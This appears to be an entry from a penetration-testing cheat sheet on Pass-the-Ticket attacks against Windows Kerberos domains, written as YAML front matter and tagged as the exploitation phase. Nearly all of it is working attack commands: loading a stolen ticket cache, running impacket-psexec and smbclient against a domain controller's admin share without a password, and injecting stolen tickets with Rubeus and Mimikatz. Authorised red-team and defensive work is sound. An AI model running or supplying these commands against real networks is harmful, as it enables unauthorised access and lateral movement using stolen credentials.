---
description: |
  Pass-the-Ticket (PtT) — use stolen Kerberos TGT or TGS tickets to authenticate without knowing the password or hash.
commands:
  - have: TGT
    cmd: |
      # Set the Kerberos ticket cache (Linux)
      export KRB5CCNAME=ticket.ccache

      # PsExec with Kerberos ticket
      impacket-psexec senshu.sh/sec_user@DC.senshu.sh -k -no-pass

      # SMBClient with Kerberos ticket
      smbclient //DC.senshu.sh/C$ -k --no-pass

      # Rubeus — import .kirbi ticket (Windows)
      .\Rubeus.exe ptt /ticket:ticket.kirbi

      # Mimikatz — inject ticket into session (Windows)
      mimikatz.exe "kerberos::ptt ticket.kirbi"
  - have: TGS
    cmd: |
      # Set the Kerberos ticket cache for service ticket
      export KRB5CCNAME=service_ticket.ccache

      # Use TGS for specific service access (e.g., CIFS for file share)
      smbclient //DC.senshu.sh/C$ -k --no-pass

      # Rubeus — import service ticket (Windows)
      .\Rubeus.exe ptt /ticket:service_ticket.kirbi

      # Note: TGS only grants access to the specific service it was issued for
      # TGT grants access to request tickets for any service in the domain
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
techniques:
  - Pass-the-Ticket
references:
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
  - https://github.com/gentilkiwi/mimikatz
---
